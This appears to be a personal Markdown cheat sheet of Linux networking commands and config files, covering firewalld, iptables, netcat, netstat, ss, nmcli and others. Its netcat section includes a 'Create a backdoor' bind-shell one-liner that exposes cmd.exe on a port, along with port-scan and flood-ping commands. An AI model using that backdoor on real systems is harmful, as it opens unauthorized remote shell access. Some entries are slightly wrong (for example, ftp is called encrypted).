# Linux networking
## Diagnosing network problems
Test from the inside out, starting with the loopback
  1. ping looback address, testing the TCP/IP stack
  2. ping the hardware interface
  3. ping another host on the network
  4. ping the gateway
  5. ping an IP address on the Internet
  6. ping a hostname on the Internet

## Commands

Command                             | Effect or description
:---                                | :---
[`dhclient`](dhclient.md)           | obtain and configure TCP/IP information from a server on the network (LGLC: 34)
[`dig`](#dig)                       | Perform a DNS lookup, useful when troubleshooting a DNS issue (cf. `nslookup`)
`ftp`                               | encrypted file transfers
[`firewalld`](#firewalld)           | Successor to `iptables` in Red Hat, and like its predecessor a frontend to the netfilter protocols. Places network traffic into zones. Commands have to be written twice: once to affect running config and again to have the change saved
[`hostnamectl`](#hostnamectl)       | 
[`ifconfig`](#ifconfig)             | Interface configuration, used to assign a TCP/IP configuration to a network interface, but no longer installed on modern distros.
[`iptables`](#iptables)             | A popular firewall, like `firewalld`, a frontend for the kernel-level `netfilters` service.
[`nc`](#nc)                         | netcat utility. It allows testing of a host's ports, similar to __ping__, but more versatile because __ping__ only uses the portless ICMP protocol. GNU and OpenBSD versions available (itp-l+: 28)
[`netplan`](#netplan)               | Ubuntu network configuration tool
[`netstat`](#netstat)               | 
[`NetworkManager`](#networkmanager) | 
`nmap`                              | audit open ports on a host
[`nmcli`](#nmcli)                   | Interface to Network Manager, which allows for consistent network configuration across a system.
[`nslookup`](#nslookup)             | Perform a DNS lookup in an interactive shell with cleaner output than __dig__. Enter a domain name and you get output in two sections. [NetworkWorld](https://www.networkworld.com/video/95669/how-to-use-the-nslookup-command-2-minute-linux-tip#tk.rss_linux)
[`ping`](#ping)                     | "packet Internet groper" utility used for checking network connections, using ICMP packets (cf. __nc__)
[`route`](#route)                   | Display and manipulate the routing table
[`ss`](#ss)                         | "socket statistics", successor to __netstat__. 
[`tcpdump`](#tcpdump)               | Inspect actual IP packets (Wireshark is a GUI-based alternative)
`tracepath`                         | Successor to `traceroute`, allowing the user to test connectivity along the path. Doesn't show as much detail with regard to time, so it may be faster.
`traceroute`                        | Provides much more information than `tracepath`, even though it's older (lxa-lpic: 109.3)
[`xinetd`](#xinetd)                 | Internet Super Daemon provided an alternate method of connecting to various outdated network services. Should be turned off nowadays.  

## dhclient
#### Turn on the DHCP client and get a new address from the server
```
sudo dhclient
```
#### Release the IP address currently assigned and request a new IP lease
```
sudo dhclient -r
```

## dig

#### Nameserver
```
dig example.com NS
```
#### Mail server
```
dig example.com MX
```

## firewalld
Successor to `iptables` in Red Hat, and like its predecessor a frontend to the netfilter protocols. Places network traffic into zones. Commands have to be written twice: once to affect running config and again to have the change saved
### Config files

File | Description
:--- | :---
/etc/sysconfig/network-scripts/ifcfg-ens33 | interface settings
/usr/lib/firewalld/services | .xml files that define services ("ZONE=public")

### Tasks
#### Display status of service
```
firewall-cmd --state
```
#### Display default zone
```
firewall-cmd --get-default-zone
```
#### Display zones that are attached to an interface
```
firewall-cmd --get-active-zones
```
#### Add a new zone
```
firewall-cmd --new-zone=testlab
```
#### Add a new zone, and write the change to disk
```
firewall-cmd --new-zone=testlab  --permanent
```
#### Load saved configuration
```
firewall-cmd --reload
```
#### Display names of all available services
```
firewall-cmd --get-services
```
#### Add a service permanently
```
firewall-cmd --add-service=ftp --permanent
```
#### Display services loaded in memory
```
firewall-cmd --list-services
```
```
firewall-cmd --remove-service
```
#### Add nonstandard port
```
firewall-cmd --add-port=8080/tcp
```
#### Add a range of nonstandard ports
```
firewall-cmd --add-port=50000-60000/udp
```
#### See approved port numbers
```
firewall-cmd --list-ports
```


## hostnamectl
#### Permanently change hostname to {hostname} (systemd)
```
sudo hostnamectl set-hostname hostname
```

## ifconfig
"RX" and "TX" stand for received and transmitted.
#### Apply a static IP address to interface {eth0} and turn it on ("up")
```
ifconfig eth0 up 10.1.230.245 netmask 255.255.255.0
```
#### Bring an interface up or down
```
ifup eth0
ifdown eth0
```
```
ifconfig eth0 up
ifconfig eth0 down
```

## iptables

### Config files

File | Description
:---   | :---
/etc/sysconfig/iptables | location of saved config

### Syntax

Syntax | Effect
:---   | :---
`iptables --list` | will produce output even if the service is not running
`systemctl enable --now iptables` | start iptables service
`iptables --list-rules` | display rules as written on disk
`iptables -A INPUT -p tcp --dport 80 -j ACCEPT` | accept TCP traffic to port 80
`iptables -A INPUT -p tcp --dport ssh -s 10.0.222.222 -j ACCEPT` | accept SSH traffic from a particular source
`iptables-save` | stdout only; must be redirected to a file
`iptables -F` | reload config file
`systemctl restart iptables`
`iptables -vnL --line` | show statistics for configuration lines
`watch -n 0.5 iptables -vnL` \ update twice a second, producing a dashboard


## nc
#### Connect to host on port 80
```
nc example.com 80
```
#### Scan ports
```
# Scan a single port
nc -v -w 2 z 192.168.56.1 22

# Scan multiple ports
nc -v -w 2 z 192.168.56.1 22 80

# Scan a range of ports
nc -v -w 2 z 192.168.56.1 22-25
```

#### Transfer files between servers
This example uses the `pv` utility to monitor progress.
```
# Run `nc` in listening mode (`-l` option) on port 3000
tar -zcf - debian-10.0.0-amd64-xfce-CD-1.iso | pv | nc -l -p 3000 -q 5

# On the receiving client, to obtain the file:
nc 192.168.1.4 3000 | pv | tar -zxf -
```

#### Create a command-line chat server
```
# Create chat server listening on port 5000
nc -l -vv -p 5000

# Launch a chat session on the other system
nc 192.168.56.1 5000
```

#### Find a service running on port
Obtain port banners (`-n` disables DNS lookup)
```
nc -v -n 192.168.56.110 80
```

#### Create stream sockets
Create and listen on a UNIX-domain stream socket
```
nc -lU /var/tmp/mysocket &
ss -lpn | grep "/var/tmp/"
```

#### Create a backdoor
Netcat needs to listen on a chosen port (here 3001): `-d` disables reading from stdin; `-e` specifies the command to run on the target system
```
nc -L -p 3001 -d -e cmd.exe
```

## netplan
### Config files
File          | Description
:---          | :---
/etc/netplan/ | directory containing various configuration files and scripts
/etc/nplan/99_config.yaml | netplan config
#### Apply network configuration changes
```
sudo netplan apply
```

## netstat
#### Show interface statistics 
> LGLC: 535
```
netstat -i
``` 
#### Display routing table 
> lxa-lpic: 109.2, itp-lpic: 39
```
netstat -r
netstat --route
``` 
#### Show all sockets on all active interfaces 
> lxa-lpic: 109.2
```
netstat -a
``` 
#### Show network traffic 
> itp-lpic.md
```
netstat -an
``` 
#### Count number of TCP connections 
> lxa-lpic: 109.2
```
netstat -a | grep tcp - | wc -l
``` 
#### Refresh every 5 seconds 
> lxa-lpic: 109.2
```
netstat -c 5 -a
``` 
#### TCP connections 
>lxa-lpic: 109.2
```
netstat -t
``` 
#### Active sessions 
>itp-lpic: 39
```
netstat -tp
``` 
#### All sessions
> itp-lpic: 39
```
netstat -atp
``` 
#### Routing table with name resolution 
> lxa-lpic: 109.2
```
netstat -rn
``` 
#### Get the list of IPs and ports that are connected via https on your webserver every second
```
watch -n 1 'netstat -an | grep ":443"'
``` 
#### Get the total number of connections on port 80 every second
```
watch -n 1 'netstat -an | grep ":80" | wc -l'
```

## networkmanager

`chkconfig NetworkManager off`, `systemctl disable NetworkManager.service`, `service NetworkManager stop` stop NetworkManager service (Upstart, Systemd, Sysvinit)

## nmcli
#### Display devices and statuses
```
nmcli device status
```
#### Display information on interfaces as well as status
Including other network connections not managed by network manager ("unmanaged") or not connected ("unavailable") 
```
nmcli dev status
```
#### Display what connections are enabled 
```
nmcli general status
```
#### Display UUIDs associated with network connections 
```
nmcli connection show --active
```
#### Display much more information on network devices
```
nmcli device show
```

## nslookup
### Tasks
#### Get IP address of a website
```
nslookup url
```
#### Get only nameservers
```
nslookup -type=ns url
```
#### Get only MX records
```
nslookup -type=mx url
```
#### Get Start of Authority (SOA) record
```
nslookup -type=soa url
```
#### Display all available records
```
nslookup -type=any url
```
#### Perform reverse DNS lookup on {ipaddress}
```
nslookup ipaddress
```
#### Specify port {portno} in the lookup
```
nslookup -port=portno url
```

## ping
#### Numeric output only
```
ping -n
```
#### Send {n} number of pings
```
ping -c n
``` 
#### Flood ping
```
ping -f
```
#### Print timestamp
```
ping -D
```
#### Mark outgoing packet to be processed appropriate to kernel's policy
```
ping -m
``` 
#### Bypass routing tables
```
ping -r
```

## route
### Tasks
#### Display routing table
```
route -n
```
#### Add a default gateway
```
route add default gw 192.168.0.1
```
#### Remove a default gateway
```
route del default gw 192.168.0.1
```
#### Give a particular network a different gateway
```
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.0.1
```

## ss
### Options
Options are of two kinds:
  1. Connection type (listening or established)
    - `ss` display established connections (default)
    - `ss -l` , `ss --listening` display sockets listening
    - `ss -a` , `ss --all` display both listening sockets and established connections
  2. Protocol type
    - `ss` display all protocol sockets (default)
    - `ss -t` , `ss --tcp` display TCP protocol sockets
    - `ss -u` , `ss --udp` display UDP sockets
    - `ss -x` , `ss --unix` display Unix domain sockets
### Tasks
#### Display port numbers instead of protocol names
```
ss -n
```
```
ss --numeric
```
#### Do __name__ lookups and display __all__ information
```
ss -an
```
#### Display all active TCP sessions
```
ss -atp
```
#### Display active TCP sessions
```
ss -tp
```
#### Display routing table (cf. `ip route`)
```
ss --route
```
#### Display programs with open ports 
```
ss --program
```
#### Show all running servers 
"Tuna please"
```
ss -tunapl
```

## tcpdump
#### All network data will be displayed to STDOUT
```
tcpdump -i eth0
```

## xinetd

File | Description
:--- | :---
/etc/xinet.d/ | config files
/etc/xinetd.conf  | master xinetd configuration
/etc/cmd.allow  | specify who is allowed to run a command
/etc/cmd.deny | specify who is disallowed from running a command

## Sources
  - "8 Netcat (nc) Command with Examples". [TecMint](https://www.tecmint.com/netcat-nc-command-examples/): 2019/08/09.
  - "Bite Size Networking". [wizardzines.com](https://wizardzines.com/zines/bite-size-networking/)
  - "How to use the nmcli command: Linux Tip" [networkworld.com](https://www.networkworld.com/video/94347/how-to-use-the-nmcli-command-linux-tip#tk.rss_linux)
  - "nslookup Command: 7 Practical Examples" [linuxhandbook.com](https://linuxhandbook.com/nslookup-command/)